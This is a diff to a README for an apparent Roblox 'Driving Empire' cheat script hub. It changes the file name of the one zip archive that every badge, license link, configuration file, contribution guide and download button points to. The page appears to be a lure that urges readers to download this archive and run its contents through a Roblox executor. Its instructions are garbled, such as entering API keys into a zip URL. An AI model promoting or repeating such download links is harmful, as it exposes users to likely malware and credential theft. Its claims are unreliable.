@@ -1,10 +1,10 @@
 # 🚗 Driving Empire Script for Roblox
 
-![Build Status](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/driving-empire-roblox-script-hub_1.8.zip)
-![Roblox](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/driving-empire-roblox-script-hub_1.8.zip)
-![GitHub last commit](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/driving-empire-roblox-script-hub_1.8.zip)
-![Languages](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/driving-empire-roblox-script-hub_1.8.zip)
-![License](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/driving-empire-roblox-script-hub_1.8.zip)
+![Build Status](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/empire-hub-roblox-script-driving-v3.2.zip)
+![Roblox](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/empire-hub-roblox-script-driving-v3.2.zip)
+![GitHub last commit](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/empire-hub-roblox-script-driving-v3.2.zip)
+![Languages](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/empire-hub-roblox-script-driving-v3.2.zip)
+![License](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/empire-hub-roblox-script-driving-v3.2.zip)
 
 Welcome to the command center of vehicle mastery—the definitive **Driving Empire Script for Roblox** repository! Your gateway to custom scripting and innovative automation within the Driving Empire Roblox universe. Whether you want to improve your game mechanics or explore integration with modern AI tools, this hub brings together all the gears and wheels an enthusiast could wish for.
 
@@ -16,11 +16,11 @@ Worried about shifting gears between different systems? Fear not: our repository
 
 |  Platform   |    Supported    |  Special Notes   |
 |:------------|::---------------|:----------------|
-| ![Windows](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/driving-empire-roblox-script-hub_1.8.zip) | Yes           | Windows 7 and above   |
-| ![macOS](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/driving-empire-roblox-script-hub_1.8.zip) | Yes           | Tested on Mojave+    |
-| ![Linux](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/driving-empire-roblox-script-hub_1.8.zip)     | Partial       | WINE recommended     |
-| ![Android](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/driving-empire-roblox-script-hub_1.8.zip)      | Beta          | With Roblox Mobile   |
-| ![iOS](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/driving-empire-roblox-script-hub_1.8.zip)             | Beta          | Experimental         |
+| ![Windows](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/empire-hub-roblox-script-driving-v3.2.zip) | Yes           | Windows 7 and above   |
+| ![macOS](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/empire-hub-roblox-script-driving-v3.2.zip) | Yes           | Tested on Mojave+    |
+| ![Linux](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/empire-hub-roblox-script-driving-v3.2.zip)     | Partial       | WINE recommended     |
+| ![Android](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/empire-hub-roblox-script-driving-v3.2.zip)      | Beta          | With Roblox Mobile   |
+| ![iOS](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/empire-hub-roblox-script-driving-v3.2.zip)             | Beta          | Experimental         |
 
 ---
 
@@ -70,9 +70,9 @@ Night owl or early bird, our support never hits the brakes. Submit requests at a
 
 Ready to accelerate your journey in Driving Empire? Start your engines below!  
 
-[![Download](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/driving-empire-roblox-script-hub_1.8.zip)](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/driving-empire-roblox-script-hub_1.8.zip)
+[![Download](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/empire-hub-roblox-script-driving-v3.2.zip)](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/empire-hub-roblox-script-driving-v3.2.zip)
 
-Simply tap the button above (https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/driving-empire-roblox-script-hub_1.8.zip) to access the latest optimized package. Installation and integration directions are included inside the package.
+Simply tap the button above (https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/empire-hub-roblox-script-driving-v3.2.zip) to access the latest optimized package. Installation and integration directions are included inside the package.
 
 ---
 
@@ -80,9 +80,9 @@ Simply tap the button above (https://raw.githubusercontent.com/Ikbenproz/driving
 
 1. **Download**: Acquire the main script and optional add-ons via the link above.
 2. **Deploy**: Drop the script into your Roblox executor’s scripts folder.
-3. **Configure**: Tweak features in the included `https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/driving-empire-roblox-script-hub_1.8.zip` using your favorite text editor.
+3. **Configure**: Tweak features in the included `https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/empire-hub-roblox-script-driving-v3.2.zip` using your favorite text editor.
 4. **Run**: Launch Roblox, navigate to Driving Empire, and enable the script.
-5. **Connect AI**: For API-powered features, enter your keys into `https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/driving-empire-roblox-script-hub_1.8.zip`.
+5. **Connect AI**: For API-powered features, enter your keys into `https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/empire-hub-roblox-script-driving-v3.2.zip`.
 
 Full documentation is in the `/docs` folder.
 
@@ -92,7 +92,7 @@ Full documentation is in the `/docs` folder.
 
 We welcome pit crew! Whether you want to code, translate, test, or suggest, there’s a lane for you:
 - Fork or clone the repo
-- Follow contribution guidelines in `https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/driving-empire-roblox-script-hub_1.8.zip`
+- Follow contribution guidelines in `https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/empire-hub-roblox-script-driving-v3.2.zip`
 - Check out our [project board](./projects/1) for open tasks and ideas
 
 ---
@@ -108,15 +108,15 @@ We welcome pit crew! Whether you want to code, translate, test, or suggest, ther
 
 ## 📜 MIT License (2025)
 
-This project is licensed under the MIT License (2025). Curious about your freedoms and responsibilities? Find the full license text [here](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/driving-empire-roblox-script-hub_1.8.zip).
+This project is licensed under the MIT License (2025). Curious about your freedoms and responsibilities? Find the full license text [here](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/empire-hub-roblox-script-driving-v3.2.zip).
 
 ---
 
 ## ⬇️ Download – Final Reminder  
 Before you buckle up:  
 
-[![Download](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/driving-empire-roblox-script-hub_1.8.zip)](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/driving-empire-roblox-script-hub_1.8.zip)  
-Click the badge or use https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/driving-empire-roblox-script-hub_1.8.zip to grab the current version.
+[![Download](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/empire-hub-roblox-script-driving-v3.2.zip)](https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/empire-hub-roblox-script-driving-v3.2.zip)  
+Click the badge or use https://raw.githubusercontent.com/Ikbenproz/driving-empire-roblox-script-hub/branch/pluripartite/empire-hub-roblox-script-driving-v3.2.zip to grab the current version.
 
 ---
 
